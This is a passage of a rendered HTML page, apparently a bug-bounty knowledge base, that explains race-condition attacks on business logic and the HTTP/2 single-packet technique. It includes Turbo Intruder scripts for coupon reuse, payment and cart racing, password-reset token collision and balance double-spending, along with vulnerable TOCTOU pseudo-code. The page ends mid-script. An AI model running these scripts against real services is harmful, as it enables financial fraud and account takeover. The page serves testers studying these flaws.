+  <a href="#poc-report-template" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PoC Report Template
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        
+        
+          
+        
+      
+      
+        <a href="../../tags/#tag:high" class="md-tag md-tag-icon md-tag--high">high</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="race-condition-business-logic-bypass">Race Condition → Business Logic Bypass<a class="headerlink" href="#race-condition-business-logic-bypass" title="Permanent link">&para;</a></h1>
+<p>Exploiting timing windows to break application state and bypass security controls.</p>
+<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<p>Race conditions exploit the gap between <strong>check</strong> and <strong>action</strong>. When multiple requests hit a server simultaneously, they can:
+- Use coupons/gift cards multiple times
+- Double-spend account balances
+- Bypass rate limits and 2FA
+- Corrupt session state for account takeover</p>
+<p><strong>Key insight</strong>: Every HTTP request transitions through hidden "sub-states" — with precise timing, you can abuse these fleeting states.</p>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Concurrent Requests → Race Window → State Collision → Logic Bypass
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>                           ↓
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>   Limit Bypass     (coupons, votes, rewards)
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>   Balance Manip    (double-spend, overdraw)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>   State Confusion  (password reset, 2FA bypass)
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>   Session Fixation (email verification swap)
+</span></code></pre></div>
+<hr />
+<h2 id="http2-single-packet-attack">HTTP/2 Single-Packet Attack<a class="headerlink" href="#http2-single-packet-attack" title="Permanent link">&para;</a></h2>
+<p><strong>The breakthrough technique from James Kettle (PortSwigger) — Black Hat USA 2023</strong></p>
+<p>Traditional race conditions were unreliable due to network jitter. The single-packet attack solves this by completing 20-30 HTTP/2 requests with a <strong>single TCP packet</strong>, eliminating network variance entirely.</p>
+<h3 id="how-it-works">How It Works<a class="headerlink" href="#how-it-works" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1. Open HTTP/2 connection
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>2. Send all requests EXCEPT final byte of each
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>3. Wait 100ms for packets to arrive at server
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>4. Send ALL final bytes in ONE TCP packet
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>5. Server processes all requests simultaneously
+</span></code></pre></div>
+<h3 id="benchmark-results">Benchmark Results<a class="headerlink" href="#benchmark-results" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Median Spread</th>
+<th>Std Deviation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Last-byte sync (HTTP/1.1)</td>
+<td>4ms</td>
+<td>3ms</td>
+</tr>
+<tr>
+<td><strong>Single-packet (HTTP/2)</strong></td>
+<td><strong>1ms</strong></td>
+<td><strong>0.3ms</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Result</strong>: 4-10x more effective. A real vulnerability that took 2+ hours with last-byte sync was exploited in <strong>30 seconds</strong> with single-packet.</p>
+<hr />
+<h2 id="turbo-intruder-scripts">Turbo Intruder Scripts<a class="headerlink" href="#turbo-intruder-scripts" title="Permanent link">&para;</a></h2>
+<h3 id="basic-single-packet-attack">Basic Single-Packet Attack<a class="headerlink" href="#basic-single-packet-attack" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span>  <span class="c1"># Required for HTTP/2</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>                          <span class="p">)</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    <span class="c1"># Queue 20 identical requests with gate</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>    <span class="c1"># Release all requests simultaneously</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="k">def</span><span class="w"> </span><span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>    <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="multi-endpoint-race-payment-add-item">Multi-Endpoint Race (Payment + Add Item)<a class="headerlink" href="#multi-endpoint-race-payment-add-item" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span><span class="p">)</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="c1"># Payment request</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="n">paymentReq</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /checkout/pay HTTP/2</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="s1">Cookie: session=xxx</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="s1">Content-Type: application/x-www-form-urlencoded</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="s1">cart_id=123&amp;payment_method=card&#39;&#39;&#39;</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>    <span class="c1"># Add item request  </span>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>    <span class="n">addItemReq</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /cart/add HTTP/2</span>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="s1">Cookie: session=xxx</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="s1">Content-Type: application/x-www-form-urlencoded</span>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="s1">product_id=expensive_item&amp;qty=1&#39;&#39;&#39;</span>
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>    <span class="c1"># Send payment + multiple add-item requests</span>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">paymentReq</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">addItemReq</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="password-reset-token-race">Password Reset Token Race<a class="headerlink" href="#password-reset-token-race" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span><span class="p">)</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="c1"># Same session, two different emails</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span class="n">attackerEmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /password-reset HTTP/2</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="s1">Cookie: session=victim_session</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="s1">Content-Type: application/x-www-form-urlencoded</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="s1">email=attacker@evil.com&#39;&#39;&#39;</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    <span class="n">victimEmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /password-reset HTTP/2</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="s1">Cookie: session=victim_session</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="s1">Content-Type: application/x-www-form-urlencoded</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="s1">email=victim@target.com&#39;&#39;&#39;</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>    <span class="c1"># Alternate to maximize collision chance</span>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">attackerEmail</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">victimEmail</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="http11-fallback-last-byte-sync">HTTP/1.1 Fallback (Last-Byte Sync)<a class="headerlink" href="#http11-fallback-last-byte-sync" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>  <span class="c1"># Parallel connections</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>                          <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">THREADED</span>  <span class="c1"># HTTP/1.1 mode</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>                          <span class="p">)</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">start</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">complete</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="chain-1-limit-overrun-coupondiscount-abuse">Chain 1: Limit Overrun — Coupon/Discount Abuse<a class="headerlink" href="#chain-1-limit-overrun-coupondiscount-abuse" title="Permanent link">&para;</a></h2>
+<p><strong>The classic race condition — apply a one-time code multiple times</strong></p>
+<h3 id="vulnerable-pattern">Vulnerable Pattern<a class="headerlink" href="#vulnerable-pattern" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Pseudo-code: TOCTOU vulnerability</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">apply_coupon</span><span class="p">(</span><span class="n">coupon_code</span><span class="p">,</span> <span class="n">cart</span><span class="p">):</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="k">if</span> <span class="n">coupon_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">used_coupons</span><span class="p">:</span>     <span class="c1"># CHECK</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>        <span class="n">cart</span><span class="o">.</span><span class="n">apply_discount</span><span class="p">(</span><span class="n">coupon_code</span><span class="p">)</span>     <span class="c1"># USE</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>        <span class="n">used_coupons</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">coupon_code</span><span class="p">)</span>        <span class="c1"># UPDATE (too late!)</span>
+</span></code></pre></div>
+<h3 id="attack">Attack<a class="headerlink" href="#attack" title="Permanent link">&para;</a></h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nf">POST</span> <span class="nn">/cart/coupon</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">shop.example.com</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">session=abc123</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="nt">code</span><span class="o">=</span><span class="s">SAVE50</span>
+</span></code></pre></div>
+<p><strong>Send 20+ times simultaneously → discount applied multiple times</strong></p>
+<h3 id="real-world-examples">Real-World Examples<a class="headerlink" href="#real-world-examples" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Vulnerability</th>
+<th>Bounty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reverb.com</td>
+<td>Gift card redeemed multiple times</td>
+<td>$500</td>
+</tr>
+<tr>
+<td>Starbucks</td>
+<td>Reward points multiplied</td>
+<td>$3,000</td>
+</tr>
+<tr>
+<td>Various e-commerce</td>
+<td>Coupon stacking via race</td>
+<td>$1,000-5,000</td>
+</tr>
+</tbody>
+</table>
+<h3 id="burp-suite-repeater-method">Burp Suite Repeater Method<a class="headerlink" href="#burp-suite-repeater-method" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Create request group (right-click → Add to tab group)</li>
+<li>Add 20 copies of coupon request</li>
+<li>Right-click group → <strong>Send group in parallel</strong></li>
+</ol>
+<hr />
+<h2 id="chain-2-balance-manipulation-double-spend">Chain 2: Balance Manipulation — Double-Spend<a class="headerlink" href="#chain-2-balance-manipulation-double-spend" title="Permanent link">&para;</a></h2>
+<p><strong>Withdraw/transfer more than your balance allows</strong></p>
+<h3 id="vulnerable-pattern_1">Vulnerable Pattern<a class="headerlink" href="#vulnerable-pattern_1" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">withdraw</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">amount</span><span class="p">):</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    <span class="n">balance</span> <span class="o">=</span> <span class="n">get_balance</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>     <span class="c1"># READ</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    <span class="k">if</span> <span class="n">balance</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">:</span>           <span class="c1"># CHECK</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>        <span class="c1"># Race window here!</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>        <span class="n">deduct_balance</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">amount</span><span class="p">)</span> <span class="c1"># WRITE</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>        <span class="n">send_money</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="attack-scenario">Attack Scenario<a class="headerlink" href="#attack-scenario" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Account balance: $100
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Attacker sends 5 concurrent withdrawals of $100
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Expected: 1 succeeds, 4 fail
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Actual: 2-3 succeed = $200-300 withdrawn from $100 balance
+</span></code></pre></div>
+<h3 id="turbo-intruder-script">Turbo Intruder Script<a class="headerlink" href="#turbo-intruder-script" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span><span class="p">)</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
